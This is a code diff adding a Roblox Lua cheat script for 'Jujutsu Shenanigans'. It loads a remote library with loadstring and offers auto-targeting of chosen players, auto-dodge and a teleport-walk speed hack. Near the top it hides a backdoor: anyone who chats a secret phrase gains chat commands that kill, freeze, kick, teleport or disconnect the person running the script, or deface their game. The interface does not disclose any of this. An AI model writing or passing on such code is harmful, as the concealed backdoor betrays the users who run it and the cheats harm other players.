@@ -1,0 +1,351 @@
+local library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local targetPlayer = nil
+local Farming = false
+local teleportWalkSpeed = 10
+local tpwalking = false
+local Dodge = false
+local whitelist = nil  -- Variable to store the whitelisted user ID
+
+local commands = {
+    ["kill"] = function(args)
+        -- Execute kill command on the target player
+        if LocalPlayer and LocalPlayer.Character then
+            local hum = LocalPlayer.Character.Humanoid
+            if hum and hum.Health > 0 then 
+                hum:ChangeState(Enum.HumanoidStateType.Dead)
+                hum.Health = 0
+            end
+        end
+    end,
+
+    ["tp"] = function(args, str)
+        local targetPlaceId = tonumber(args[1]) or game.PlaceId
+        game:GetService("TeleportService"):Teleport(targetPlaceId)
+    end,
+
+    ["shutdown"] = function(args)
+        game:Shutdown()
+    end,
+
+    ["kick"] = function(args, str)
+        task.spawn(function()
+            LocalPlayer:Kick(str)
+        end)
+    end,
+
+    ["freeze"] = function(args)
+        if LocalPlayer.Character and LocalPlayer.Character.Humanoid.Health > 0 then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        end
+    end,
+    
+    ["unfreeze"] = function(args)
+        if LocalPlayer.Character and LocalPlayer.Character.Humanoid.Health > 0 then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        end
+    end,
+
+    ["rickroll"] = function(args)
+        local function funnyfunc(v)
+            if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+                v.Image = "http://www.roblox.com/asset/?id=7083449168"
+            elseif v:IsA("TextLabel") or v:IsA("TextButton") then
+                v.Text = "Never gonna give you up"
+            elseif v:IsA("Texture") or v:IsA("Decal") then
+                v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+            elseif v:IsA("MeshPart") then
+                v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+            elseif v:IsA("SpecialMesh") then
+                v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+            elseif v:IsA("Sky") then
+                v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+                v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+                v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+                v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+                v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+                v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+            end
+        end
+    
+        for _, v in ipairs(game:GetDescendants()) do
+            funnyfunc(v)
+        end
+        game.DescendantAdded:Connect(funnyfunc)
+    end,
+}
+
+-- Function to handle chat messages
+local function onPlayerChatted(player, message)
+    if message == "/w B1GDYT6SG8GF3" then
+        print("Whitelist connection!")
+        whitelist = player.UserId
+    end
+
+    -- Ensure the player is whitelisted before executing commands
+    if player.UserId == whitelist then
+        local command, args = message:match("^;([%a%d]+)%s*(.*)$")
+        if command and commands[command] then
+            commands[command](args, player)
+        end
+    end
+end
+
+-- Connect the chat event for all current players
+for _, player in pairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+-- Connect the PlayerAdded event to ensure we catch new players
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+
+
+
+
+local Jujutsu = library:CreateWindow({
+    Name = "Jujutsu Shenanigans",
+    Themeable = {
+        Info = "funni"
+    }
+})
+
+local General = Jujutsu:CreateTab({
+    Name = "General"
+})
+
+local FarmingSection = General:CreateSection({
+    Name = "Farming"
+})
+
+local MiscSection = General:CreateSection({
+    Name = "Misc"
+})
+
+local function Attack(targetPlayer)
+    if not Farming or not targetPlayer then
+        return  -- Stop the function if Farming is false or targetPlayer is invalid
+    end
+
+    local targetRootPart = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+    if targetRootPart then
+        while Farming and targetPlayer.Character and targetRootPart do
+            local targetPosition = targetRootPart.Position
+            local offsetPosition = targetPosition - (targetRootPart.CFrame.LookVector * 3)
+
+            -- Check if the target is within 30 studs
+            if (humanoidRootPart.Position - offsetPosition).Magnitude <= 30 then
+                humanoidRootPart.CFrame = CFrame.new(offsetPosition)
+            else
+                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, 30, 0))
+
+                local tweenInfo = TweenInfo.new(
+                    1,
+                    Enum.EasingStyle.Linear,
+                    Enum.EasingDirection.Out
+                )
+
+                local tween = TweenService:Create(
+                    humanoidRootPart,
+                    tweenInfo,
+                    {CFrame = CFrame.new(Vector3.new(offsetPosition.X, humanoidRootPart.Position.Y, offsetPosition.Z))}
+                )
+
+                tween:Play()
+                tween.Completed:Wait()
+
+                humanoidRootPart.CFrame = CFrame.new(offsetPosition)
+            end
+
+            -- Check continuously while within 30 studs and Farming is true
+            while Farming and targetPlayer.Character and targetRootPart and (humanoidRootPart.Position - offsetPosition).Magnitude <= 30 do
+                task.wait()
+                targetRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                targetPosition = targetRootPart and targetRootPart.Position or targetPosition
+
+
+                if not targetRootPart then
+                    task.wait()  -- Wait for the targetRootPart to be valid
+                    continue
+                end
+
+                targetPosition = targetRootPart.Position
+               
+                local infoFolder = targetPlayer.Character:FindFirstChild("Info")
+                if targetRootPart then
+                    targetPosition = targetRootPart.Position
+                    local infoFolder = targetPlayer.Character:FindFirstChild("Info")
+                    if infoFolder then
+                        local children = infoFolder:GetChildren()
+                        local hasStun, hasKnockback, hasWakeup, hasDisableChase = false, false, false, false
+                        local hasAnyOtherFlag = false  -- Flag to check for any other flags not listed
+                
+                        for _, child in ipairs(children) do
+                            if child.Name == "Stun" then
+                                hasStun = true
+                            elseif child.Name == "Knockback" then
+                                hasKnockback = true
+                            elseif child.Name == "Wakeup" then
+                                hasWakeup = true
+                            elseif child.Name == "DisableChase" then
+                                hasDisableChase = true
+                            else
+                                -- If there's any other flag not listed, set the flag to true
+                                hasAnyOtherFlag = true
+                            end
+                        end
+
+                        local offsetPosition = targetPosition - (targetRootPart.CFrame.LookVector * 3)
+                        
+                            if (humanoidRootPart.Position - offsetPosition).Magnitude <= 30 then
+                                humanoidRootPart.CFrame = CFrame.new(offsetPosition)
+                            else
+                                local targetPositionNoY = Vector3.new(offsetPosition.X, humanoidRootPart.Position.Y, offsetPosition.Z)
+                                humanoidRootPart.CFrame = CFrame.new(targetPositionNoY)
+                            end
+                            
+                            humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, targetRootPart.Position)
+                        
+
+                        if Dodge == true then
+                            if hasStun or hasKnockback or hasDisableChase then
+                                print('lol hit')
+                                elseif hasAnyOtherFlag then
+                                    humanoidRootPart.CFrame = CFrame.new(targetRootPart.Position + Vector3.new(0, 20, 0))  -- Teleport up for any other flag
+                                else
+                                    local offsetPosition = targetPosition - (targetRootPart.CFrame.LookVector * 3)
+                        
+                                    if (humanoidRootPart.Position - offsetPosition).Magnitude <= 30 then
+                                        humanoidRootPart.CFrame = CFrame.new(offsetPosition)
+                                    else
+                                        local targetPositionNoY = Vector3.new(offsetPosition.X, humanoidRootPart.Position.Y, offsetPosition.Z)
+                                        humanoidRootPart.CFrame = CFrame.new(targetPositionNoY)
+                                    end
+                                    
+                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, targetRootPart.Position)
+                                end
+                            end
+                            
+                        end                    
+            else
+                break 
+            end
+        end
+
+        if not Farming then
+            break
+        end
+    end
+end
+end
+
+
+
+
+
+-- Function to farm the target player
+local function FarmPlayer()
+    while Farming and targetPlayer do
+        print('Target:', targetPlayer)
+        Attack(targetPlayer)
+        task.wait(1)  -- Adjust the wait time as needed
+    end
+end
+
+local function teleportWalk()
+    local speaker = Players.LocalPlayer
+    local chr = speaker.Character
+    local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+    while tpwalking and chr and hum and hum.Parent do
+        local delta = RunService.Heartbeat:Wait()
+        if hum.MoveDirection.Magnitude > 0 then
+            chr:TranslateBy(hum.MoveDirection * teleportWalkSpeed * delta * 10)
+        end
+        task.wait()  -- Ensure to yield to prevent excessive CPU usage
+    end
+end
+
+local function ToggleTPWalk(state)
+    tpwalking = state
+    if tpwalking then
+        print("TPwalk: On")
+        spawn(teleportWalk) -- Use spawn to run teleportWalk in a separate thread
+    else
+        print("TPwalk: Off")
+    end
+end
+
+-- Add toggle to activate farming script
+FarmingSection:AddToggle({
+    Name = "Attack nerds",
+    Flag = "",
+    Callback = function(state)
+        Farming = state
+        if Farming then
+            spawn(FarmPlayer) -- Use spawn to run FarmPlayer in a separate thread
+        end
+    end
+})
+
+-- Add toggle to activate farming script
+FarmingSection:AddToggle({
+    Name = "Auto Dodge",
+    Flag = "",
+    Callback = function(state)
+        Dodge = state
+    end
+})
+
+
+local playerList = {}
+
+-- Collect all player names
+for _, player in ipairs(Players:GetPlayers()) do
+    table.insert(playerList, player.Name)
+end
+
+-- Clear and update dropdown with player names
+FarmingSection:AddDropdown({
+    Name = "Players",
+    Value = playerList[1], -- Default value or nil for none selected
+    List = playerList,
+    Callback = function(selectedName)
+        print("Selected player:", selectedName)
+        targetPlayer = Players:FindFirstChild(selectedName)
+    end
+})
+
+-- Add toggle to enable/disable teleport walk
+MiscSection:AddToggle({
+    Name = "TPWalk",
+    Flag = "",
+    Callback = function(state)
+        ToggleTPWalk(state)
+    end
+})
+
+-- Add slider to control teleport walk speed
+MiscSection:AddSlider({
+    Name = "TPWalk Speed",
+    Min = 0,
+    Max = 100,
+    Value = 10, -- Default value
+    Precise = 2,
+    Callback = function(value)
+        teleportWalkSpeed = value
+        print("TPwalk:", value)
+    end
+})
+
